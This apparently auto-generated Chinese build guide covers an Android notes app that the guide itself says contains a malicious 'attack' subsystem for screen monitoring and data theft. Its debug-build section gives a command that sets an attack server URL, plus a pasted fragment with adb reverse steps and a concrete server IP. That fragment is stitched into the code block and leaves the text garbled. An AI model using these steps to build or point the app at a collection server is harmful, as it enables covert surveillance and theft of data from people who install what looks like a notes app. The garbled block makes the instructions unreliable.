# 如何构建和安装源码

这个项目是一个 Android 应用,使用 Gradle 构建系统。 [1](#0-0) 

## 构建步骤

### 1. 前置要求
- Java 17 或更高版本 [2](#0-1) 
- Android SDK,compileSdk 36, minSdk 34, targetSdk 36 [3](#0-2) 

### 2. 使用 Gradle Wrapper 构建

项目包含 Gradle wrapper 脚本,可以直接使用: [4](#0-3) 

**在 Linux/Mac 上:**
```bash
./gradlew assembleRelease
```

**在 Windows 上:**
```bash
gradlew.bat assembleRelease
```

### 3. 构建变体

项目定义了三个产品风味: [5](#0-4) 

- `core` - 基础版本
- `foss` - F-Droid/开源发行版
- `gplay` - Google Play 发行版

你可以构建特定变体,例如:
```bash
./gradlew assembleCoreRelease
./gradlew assembleFossRelease
./gradlew assembleGplayRelease
```

### 4. 签名配置

发布版本需要签名配置。 [6](#0-5) 项目支持两种方式:

1. 通过 `keystore.properties` 文件
2. 通过环境变量 (`SIGNING_KEY_ALIAS`, `SIGNING_KEY_PASSWORD`, `SIGNING_STORE_FILE`, `SIGNING_STORE_PASSWORD`)

如果没有签名配置,构建将是未签名的。 [7](#0-6) 

### 5. 安装

构建完成后,APK 文件位于 `app/build/outputs/apk/` 目录下。你可以:

1. 通过 ADB 安装:
```bash
adb install -r app/build/outputs/apk/core/debug/notes-12-core-debug.apk
```

2. 或直接将 APK 传输到设备上手动安装

## 调试构建

对于开发和测试,可以构建调试版本: [8](#0-7) 

```bash
./gradlew assembleDebug -PATTACK_SERVER_URL=http://<你的新服务器IP>:8080
  2. 若用 USB+adb reverse：

     adb reverse tcp:8080 tcp:8080
     （ATTACK_SERVER 仍指向 114.212.82.189 也能通，但 reverse 只对 127.0.0.1 生效，建议下次构建时换成 -PATTACK_SERVER_URL=http://127.0.0.1:8080 更稳。）
```

调试版本会在应用 ID 后添加 `.debug` 后缀。<cite />

## Notes

- 项目使用 Gradle 8.13 [9](#0-8) 
- 发布版本启用了代码混淆 (R8/ProGuard) [10](#0-9) 
- 项目包含恶意的 `attack` 子系统,用于屏幕监控和数据窃取。如果你是出于学习目的构建此项目,请注意这些安全问题。<cite />

Wiki pages you might want to explore:
- [Project Structure (addaddgo/Notes)](/wiki/addaddgo/Notes#1.1)

### Citations

**File:** app/build.gradle.kts (L6-12)
```text
plugins {
    alias(libs.plugins.android)
    alias(libs.plugins.kotlinAndroid)
    alias(libs.plugins.ksp)
    alias(libs.plugins.kotlinSerialization)
    alias(libs.plugins.detekt)
}
```

**File:** app/build.gradle.kts (L42-60)
```text
    signingConfigs {
        if (keystorePropertiesFile.exists()) {
            register("release") {
                keyAlias = keystoreProperties.getProperty("keyAlias")
                keyPassword = keystoreProperties.getProperty("keyPassword")
                storeFile = file(keystoreProperties.getProperty("storeFile"))
                storePassword = keystoreProperties.getProperty("storePassword")
            }
        } else if (hasSigningVars()) {
            register("release") {
                keyAlias = providers.environmentVariable("SIGNING_KEY_ALIAS").get()
                keyPassword = providers.environmentVariable("SIGNING_KEY_PASSWORD").get()
                storeFile = file(providers.environmentVariable("SIGNING_STORE_FILE").get())
                storePassword = providers.environmentVariable("SIGNING_STORE_PASSWORD").get()
            }
        } else {
            logger.warn("Warning: No signing config found. Build will be unsigned.")
        }
    }
```

**File:** app/build.gradle.kts (L68-70)
```text
        debug {
            applicationIdSuffix = ".debug"
        }
```

**File:** app/build.gradle.kts (L72-76)
```text
            isMinifyEnabled = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
```

**File:** app/build.gradle.kts (L83-88)
```text
    flavorDimensions.add("variants")
    productFlavors {
        register("core")
        register("foss")
        register("gplay")
    }
```

**File:** gradle/libs.versions.toml (L18-18)
```text
gradlePlugins-agp = "8.11.1"
```

**File:** gradle/libs.versions.toml (L20-22)
```text
app-build-compileSDKVersion = "36"
app-build-targetSDK = "36"
app-build-minimumSDK = "34"
```

**File:** gradle/libs.versions.toml (L23-24)
```text
app-build-javaVersion = "VERSION_17"
app-build-kotlinJVMTarget = "17"
```

**File:** gradlew (L1-1)
```text
#!/bin/sh
```
